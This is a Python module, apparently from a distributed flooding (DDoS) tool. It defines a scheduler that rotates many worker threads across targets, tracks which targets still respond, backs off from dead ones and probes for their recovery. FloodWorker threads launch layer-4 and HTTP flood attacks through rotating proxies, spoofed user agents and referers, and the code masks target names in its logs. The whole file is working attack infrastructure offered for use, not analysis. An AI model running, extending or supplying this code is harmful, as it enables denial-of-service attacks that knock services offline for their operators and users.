from __future__ import annotations

import logging
import threading
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple

from PyRoxy import Proxy
from yarl import URL

from ..adapter.methods import L4_METHODS, make_attack_thread
from .health import (
    ERROR_KIND_DNS,
    ERROR_KIND_REFUSED,
    ERROR_KIND_ROUTE,
    ERROR_KIND_TIMEOUT,
    ERROR_KIND_TLS_HTTP,
    ERROR_KIND_UNKNOWN,
    HARD_COOLDOWN_KINDS,
    TargetHealth,
)
from ..redaction import mask_target_key

logger = logging.getLogger("BaseTool")

MAX_WORKER_THREADS = 512
LAYER4_BURST_SENDS = 8
DISCOVERY_ATTEMPTS_PER_TARGET = 2


@dataclass
class TargetJob:
    method: str
    target_key: str
    layer4_addr: Optional[Tuple[str, int]] = None
    url: Optional[URL] = None
    host: Optional[str] = None
    rpc: int = 1
    proxies: Optional[Set[Proxy]] = None
    useragents: Set[str] = field(default_factory=set)
    referers: Set[str] = field(default_factory=set)


class TargetScheduler:
    BACKOFF_BASE_SEC = 2.0
    BACKOFF_MAX_SEC = 45.0
    BACKOFF_AFTER_ATTEMPTS = 3
    HARD_BACKOFF_BASE_SEC = 30.0
    HARD_BACKOFF_MAX_SEC = 120.0
    HARD_BACKOFF_AFTER_ATTEMPTS = 2
    HEALTHY_DEMOTION_STREAK = 2
    POOL_HEALTHY = 0
    POOL_DISCOVERY = 1
    POOL_DEGRADED = 2
    POOL_COOLDOWN_PROBE = 3

    def __init__(self, jobs: List[TargetJob], target_health: TargetHealth, worker_count: int = 1):
        self.jobs = jobs
        self.target_health = target_health
        self.worker_count = max(1, worker_count)
        self._lock = threading.Lock()
        self._backoff_until: Dict[str, float] = {}
        self._cursor = 0
        self._probe_cursor = 0
        self._pick_counter = 0

    def _pick_round_robin(self, group: List[TargetJob], probe: bool = False) -> TargetJob:
        if probe:
            job = group[self._probe_cursor % len(group)]
            self._probe_cursor += 1
            return job
        job = group[self._cursor % len(group)]
        self._cursor += 1
        return job

    def _failure_streak(self, key: str, snapshot: Dict[str, Dict[str, object]]) -> int:
        entry = snapshot.get(key, {})
        return int(entry.get("consecutive_failures", 0)) or max(
            0,
            int(entry.get("attempts", 0)) - int(entry.get("successes", 0)),
        )

    def _consecutive_failure_streak(
        self, key: str, snapshot: Dict[str, Dict[str, object]]
    ) -> int:
        entry = snapshot.get(key, {})
        return int(entry.get("consecutive_failures", 0))

    def _is_currently_healthy(
        self,
        key: str,
        entry: Dict[str, object],
        snapshot: Dict[str, Dict[str, object]],
    ) -> bool:
        if int(entry.get("successes", 0)) <= 0:
            return False
        streak = self._consecutive_failure_streak(key, snapshot)
        if streak < self.HEALTHY_DEMOTION_STREAK:
            return True
        kind = str(entry.get("last_error_kind", ERROR_KIND_UNKNOWN))
        return kind not in HARD_COOLDOWN_KINDS

    def _pool_for_entry(
        self,
        key: str,
        entry: Dict[str, object],
        now: float,
        in_backoff: bool,
    ) -> int:
        successes = int(entry.get("successes", 0))
        attempts = int(entry.get("attempts", 0))
        kind = str(entry.get("last_error_kind", ERROR_KIND_UNKNOWN))

        if successes > 0 and self._is_currently_healthy(key, entry, {key: entry}):
            return self.POOL_HEALTHY
        if attempts < DISCOVERY_ATTEMPTS_PER_TARGET:
            return self.POOL_DISCOVERY
        if in_backoff:
            return self.POOL_COOLDOWN_PROBE
        if kind in HARD_COOLDOWN_KINDS:
            return self.POOL_COOLDOWN_PROBE
        if kind in (
            ERROR_KIND_TIMEOUT,
            ERROR_KIND_ROUTE,
            ERROR_KIND_TLS_HTTP,
            ERROR_KIND_UNKNOWN,
        ):
            return self.POOL_DEGRADED
        return self.POOL_DEGRADED

    def summarize_pools(self, snapshot: Dict[str, Dict[str, object]], now: float) -> Dict[str, int]:
        counts = {"healthy": 0, "discovery": 0, "degraded": 0, "closed": 0, "cooldown": 0}
        for job in self.jobs:
            key = job.target_key
            entry = snapshot.get(key, {})
            in_backoff = self._backoff_until.get(key, 0) > now
            pool = self._pool_for_entry(key, entry, now, in_backoff)
            kind = str(entry.get("last_error_kind", ERROR_KIND_UNKNOWN))
            if pool == self.POOL_HEALTHY:
                counts["healthy"] += 1
            elif pool == self.POOL_DISCOVERY:
                counts["discovery"] += 1
            elif pool == self.POOL_COOLDOWN_PROBE and in_backoff:
                if kind in (ERROR_KIND_REFUSED, ERROR_KIND_DNS):
                    counts["closed"] += 1
                else:
                    counts["cooldown"] += 1
            elif kind in HARD_COOLDOWN_KINDS:
                counts["closed"] += 1
            elif pool == self.POOL_DEGRADED:
                counts["degraded"] += 1
            else:
                counts["cooldown"] += 1
        return counts

    def count_ready(self, snapshot: Dict[str, Dict[str, object]], now: float) -> int:
        ready = 0
        for job in self.jobs:
            if self._backoff_until.get(job.target_key, 0) <= now:
                ready += 1
        return ready

    def derive_diagnosis(
        self,
        pools: Dict[str, int],
        *,
        proxy_mode: str,
        useful_bytes: int,
        ready_count: int,
    ) -> str:
        total = len(self.jobs)
        if total == 0:
            return "no_targets"
        if pools["healthy"] > 0 and useful_bytes > 0:
            return "healthy"
        if pools["healthy"] == 0 and pools["closed"] >= max(1, total // 2):
            return "targets_mostly_closed"
        if proxy_mode == "proxy" and pools["healthy"] == 0 and pools["cooldown"] + pools["closed"] > 0:
            return "proxy_failure"
        if pools["degraded"] + pools["discovery"] > pools["closed"] and pools["healthy"] == 0:
            return "egress_blocked"
        if ready_count == 0:
            return "capacity_idle"
        if pools["healthy"] > 0 and useful_bytes == 0:
            return "insufficient_reachable"
        return "low_traffic_mixed"

    def pick_next(self) -> Optional[TargetJob]:
        now = time.time()
        snapshot = self.target_health.snapshot()
        self._pick_counter += 1
        probe_budget = max(10, self.worker_count // 5)
        allow_probe = (self._pick_counter % probe_budget) == 0
        allow_discovery = (self._pick_counter % 3) == 0
        recovery_probe_budget = max(12, self.worker_count * 2)
        allow_recovery_probe = (self._pick_counter % recovery_probe_budget) == 0

        with self._lock:
            buckets: Dict[int, List[TargetJob]] = {
                self.POOL_HEALTHY: [],
                self.POOL_DISCOVERY: [],
                self.POOL_DEGRADED: [],
                self.POOL_COOLDOWN_PROBE: [],
            }
            for job in self.jobs:
                key = job.target_key
                backoff_until = self._backoff_until.get(key, 0)
                in_backoff = backoff_until > now
                if in_backoff and not allow_probe:
                    continue
                entry = snapshot.get(key, {})
                pool = self._pool_for_entry(key, entry, now, in_backoff)
                if pool == self.POOL_COOLDOWN_PROBE and in_backoff and not allow_probe:
                    continue
                buckets[pool].append(job)

            discovery = buckets.get(self.POOL_DISCOVERY) or []
            if discovery and (allow_discovery or not buckets.get(self.POOL_HEALTHY)):
                return self._pick_round_robin(discovery)

            if allow_recovery_probe:
                recovery_candidates: List[TargetJob] = []
                for job in self.jobs:
                    key = job.target_key
                    entry = snapshot.get(key, {})
                    kind = str(entry.get("last_error_kind", ERROR_KIND_UNKNOWN))
                    if kind not in HARD_COOLDOWN_KINDS:
                        continue
                    successes = int(entry.get("successes", 0))
                    attempts = int(entry.get("attempts", 0))
                    if successes > 0:
                        if self._is_currently_healthy(key, entry, snapshot):
                            continue
                    elif attempts < DISCOVERY_ATTEMPTS_PER_TARGET:
                        continue
                    recovery_candidates.append(job)
                if recovery_candidates:
                    return self._pick_round_robin(recovery_candidates, probe=True)

            for pool_rank in (
                self.POOL_HEALTHY,
                self.POOL_DEGRADED,
                self.POOL_DISCOVERY,
                self.POOL_COOLDOWN_PROBE,
            ):
                group = buckets.get(pool_rank) or []
                if not group:
                    continue
                if pool_rank == self.POOL_COOLDOWN_PROBE:
                    return self._pick_round_robin(group, probe=True)
                return self._pick_round_robin(group)
            return None

    def _backoff_delay(self, key: str, snapshot: Dict[str, Dict[str, object]], streak: int) -> float:
        entry = snapshot.get(key, {})
        kind = str(entry.get("last_error_kind", ERROR_KIND_UNKNOWN))
        if kind in HARD_COOLDOWN_KINDS:
            exponent = min(max(0, streak - self.HARD_BACKOFF_AFTER_ATTEMPTS), 3)
            return min(
                self.HARD_BACKOFF_MAX_SEC,
                self.HARD_BACKOFF_BASE_SEC * (2**exponent),
            )
        exponent = min(max(0, streak - self.BACKOFF_AFTER_ATTEMPTS), 4)
        return min(self.BACKOFF_MAX_SEC, self.BACKOFF_BASE_SEC * (2**exponent))

    def note_result(self, job: TargetJob, had_success: bool) -> None:
        if had_success:
            with self._lock:
                self._backoff_until.pop(job.target_key, None)
            return

        snapshot = self.target_health.snapshot()
        streak = self._failure_streak(job.target_key, snapshot)
        entry = snapshot.get(job.target_key, {})
        kind = str(entry.get("last_error_kind", ERROR_KIND_UNKNOWN))
        threshold = (
            self.HARD_BACKOFF_AFTER_ATTEMPTS
            if kind in HARD_COOLDOWN_KINDS
            else self.BACKOFF_AFTER_ATTEMPTS
        )
        if streak < threshold:
            return

        delay = self._backoff_delay(job.target_key, snapshot, streak)
        with self._lock:
            self._backoff_until[job.target_key] = time.time() + delay


class FloodWorker(threading.Thread):
    def __init__(
        self,
        worker_id: int,
        scheduler: TargetScheduler,
        event: threading.Event,
        stats_dict: dict,
        stats_lock: threading.Lock,
        target_health: TargetHealth,
    ):
        super().__init__(daemon=True)
        self.worker_id = worker_id
        self.scheduler = scheduler
        self.event = event
        self.stats_dict = stats_dict
        self.stats_lock = stats_lock
        self.target_health = target_health

    def _success_count(self, key: str) -> int:
        snapshot = self.target_health.snapshot()
        entry = snapshot.get(key, {})
        return int(entry.get("successes", 0))

    def _execute_job(self, job: TargetJob) -> None:
        if job.method in L4_METHODS:
            instance = make_attack_thread(
                job.method,
                target_key=job.target_key,
                stats_dict=self.stats_dict,
                stats_lock=self.stats_lock,
                synevent=self.event,
                target_health=self.target_health,
                l4_target=job.layer4_addr,
                proxies=job.proxies,
            )
            instance.select(job.method)
            instance.SENT_FLOOD()
            return

        instance = make_attack_thread(
            job.method,
            target_key=job.target_key,
            stats_dict=self.stats_dict,
            stats_lock=self.stats_lock,
            synevent=self.event,
            target_health=self.target_health,
            thread_id=self.worker_id,
            url=job.url,
            host=job.host,
            rpc=job.rpc,
            useragents=job.useragents,
            referers=job.referers,
            proxies=job.proxies,
        )
        instance.select(job.method)
        instance.SENT_FLOOD()

    def run(self):
        self.event.wait()
        while self.event.is_set():
            job = self.scheduler.pick_next()
            if job is None:
                time.sleep(0.05)
                continue

            before = self._success_count(job.target_key)
            self._execute_job(job)
            after = self._success_count(job.target_key)
            self.scheduler.note_result(job, after > before)
            if after > before and before == 0:
                logger.info(
                    "target %s recovered: traffic flowing",
                    mask_target_key(job.target_key),
                )
